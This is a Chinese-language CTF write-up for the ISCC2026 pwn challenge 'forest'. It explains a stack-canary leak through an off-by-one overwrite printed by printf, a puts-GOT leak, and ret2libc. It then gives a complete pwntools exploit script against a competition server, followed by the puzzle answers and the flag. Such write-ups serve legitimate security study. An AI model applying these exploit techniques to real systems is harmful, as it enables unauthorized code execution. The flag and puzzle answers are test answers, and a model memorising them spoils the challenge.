+++
title = "forest"
date = "2026-05-18"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

Pwn——forest

解题思路

一、程序信息收集

拿到附件后先确认二进制的基本属性。文件为 x86-64 ELF，通过 checksec 可知：Canary 与 NX 开启，PIE 关闭（NO PIE），RELRO 为 Partial。这意味着代码段、GOT 表、PLT 表地址在运行前就已固定，且栈上存在 canary 校验。整体利用方向明确：绕过 canary → 拿到 libc 基址 → ret2libc 起 shell。

运行程序，首先会看到两段类似谜题的交互提示。第一段要求给出一个数字，第二段要求输入一段文字，这两个属于作者设置的"入门考核"，答案硬编码在二进制中，分别回复 100 和 magic 即可进入真正的漏洞触发路径。

二、栈布局分析与 canary 泄露

拖入 IDA 查看 main 函数，关注缓冲区与 canary 的位置关系。buf 起始于 rbp-0x20，canary 存于 rbp-0x8，两者间距为 0x18（24 字节）。canary 在 x86-64 下最低字节恒为 \\x00，这一设计本用于防止字符串函数越界读出 canary，但反而成为了泄露的突破口。

漏洞触发点在于 main 后半段的两处操作：

- read(0, buf, 0x30) —— 最多读入 48 字节

- printf("%s", buf) —— 以字符串格式输出 buf

0x30 已经超过 canary 距 buf 起点的距离（0x18）。向 buf 填入恰好 0x19 个非零字节，即可将 canary 最低位的 \\x00 覆写为其它值。此时 printf 的 %s 会越过 buf 原本的字符串终止点，将 canary 剩余 7 字节一并带出。接收输出后，定位连续 0x19 个填充字符，截取其后的 7 字节并在首位补回 \\x00，即还原出完整的 8 字节 canary 值。

三、libc 基址获取

第一处 read 负责信息泄露，第二处 read(0, buf, 0x100) 则用于控制流劫持。0x100 字节远超 0x20 的缓冲区容量，可以一路覆盖到返回地址。由于 PIE 未开启，gadget 地址可直接从 ELF 中提取。

采用 pop rdi; ret（0x401763）作为参数传递工具，构造第一条 ROP 链：

1\. 0x18 字节填充 + 原始 canary + 0x8 字节覆盖 rbp

2\. pop rdi; ret → got 表中 puts 的实际地址

3\. puts@plt → 输出该地址

4\. main 起始地址 → 执行完毕后重回 main

发送 payload 后，服务端返回 puts 在 libc 中的运行时地址。不同发行版的 libc 偏移各有差异，经过比对，远程环境匹配 libc6_2.23-0ubuntu11.3_amd64。关键偏移量如下：

- puts: 0x6F6A0

- system: 0x453A0

- /bin/sh: 0x18CE57

libc_base = leaked_puts - 0x6F6A0

四、getshell

程序重新进入 main 后，再次经历 "What do you sacrifice?" 的交互环节。用任意 24 字节结束 printf 输出，随即在下一处 read(0x100) 中发送最终 ROP 链：

1\. 0x18 字节填充 + canary + 0x8 字节覆盖 rbp

2\. ret（0x40101A）—— 维持栈的 16 字节对齐

3\. pop rdi; ret → libc_base + 0x18CE57（"/bin/sh" 字符串地址）

4\. libc_base + 0x453A0（system 函数地址）

system("/bin/sh") 执行后获得 shell，发送 cat /flag* 即可拿到 flag。

五、流程图总结

绕过两道互动关卡 → 利用 read(0x30) + printf(%s) 覆写 canary 最低 \\x00 字节并泄露 canary → 利用 read(0x100) 栈溢出构造 ROP 链调用 puts@plt 泄露 puts 真实地址 → 计算 libc 基址并返回 main → 再次利用栈溢出执行 system("/bin/sh") → 读取 flag

Exp

```python

\#!/usr/bin/env python3

from pwn import *

context(arch="amd64", os="linux", log_level="debug")

binary = ELF("./attachment-56", checksec=False)

MODE = "remote"

if MODE == "remote":

tube = remote("39.96.193.120", 10001)

PUTS_LIBC = 0x6F6A0

SYSTEM_LIBC = 0x453A0

BINSH_LIBC = 0x18CE57

elif MODE == "local":

tube = process("./attachment-56")

libc_ref = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

PUTS_LIBC = libc_ref.sym["puts"]

SYSTEM_LIBC = libc_ref.sym["system"]

BINSH_LIBC = next(libc_ref.search(b"/bin/sh\\x00"))

POP_RDI = 0x401763

RET = 0x40101A

CANARY_DIST = 24 # rbp-0x20 to rbp-0x8

# ---------- helpers ----------

def answer_puzzles():

tube.sendlineafter(b"note:\\n", b"100")

tube.sendlineafter(b"rune sheet!\\n", b"magic")

def steal_canary():

tube.recvuntil(b"What do you sacrifice?\\n")

tube.send(b"X" * (CANARY_DIST + 1))

resp = tube.recvuntil(b"A curious gift indeed.\\n")

marker = resp.index(b"X" * (CANARY_DIST + 1))

raw = resp[marker + CANARY_DIST + 1 : marker + CANARY_DIST + 8]

canary = b"\\x00" + raw

log.success("canary -&gt; " + canary.hex())

return canary

def dump_puts(canary):

rop1 = flat(

b"B" * CANARY_DIST,

canary,

b"C" * 8,

POP_RDI,

binary.got["puts"],

binary.plt["puts"],

binary.sym["main"],

)

tube.send(rop1)

tube.recvuntil(b"The ghost answers with warmth.\\n")

leak = u64(tube.recvline().strip().ljust(8, b"\\x00"))

log.success("puts@libc -&gt; " + hex(leak))

return leak

def back_to_main():

tube.recvuntil(b"What do you sacrifice?\\n")

tube.send(b"Z" * CANARY_DIST)

tube.recvuntil(b"A curious gift indeed.\\n")

# ---------- main flow ----------

answer_puzzles()

canary = steal_canary()

puts_real = dump_puts(canary)

base = puts_real - PUTS_LIBC

log.success("libc base -&gt; " + hex(base))

back_to_main()

rop2 = flat(

b"E" * CANARY_DIST,

canary,

b"F" * 8,

RET,

POP_RDI,

base + BINSH_LIBC,

base + SYSTEM_LIBC,

)

tube.send(rop2)

tube.recvuntil(b"The ghost answers with warmth.\\n")

tube.sendline(b"cat /flag* 2&gt;/dev/null; cat flag* /flag* 2&gt;/dev/null; exit")

import re

result = tube.recvall(timeout=10)

m = re.search(rb"ISCC\\{[\^}]+\\}", result)

if m:

print(m.group().decode())

else:

print(result.decode("latin-1", errors="replace"))

tube.close()

```

Flag

ISCC{9f88d97a-09b8-4e21-ad9f-9948b3a997c2}
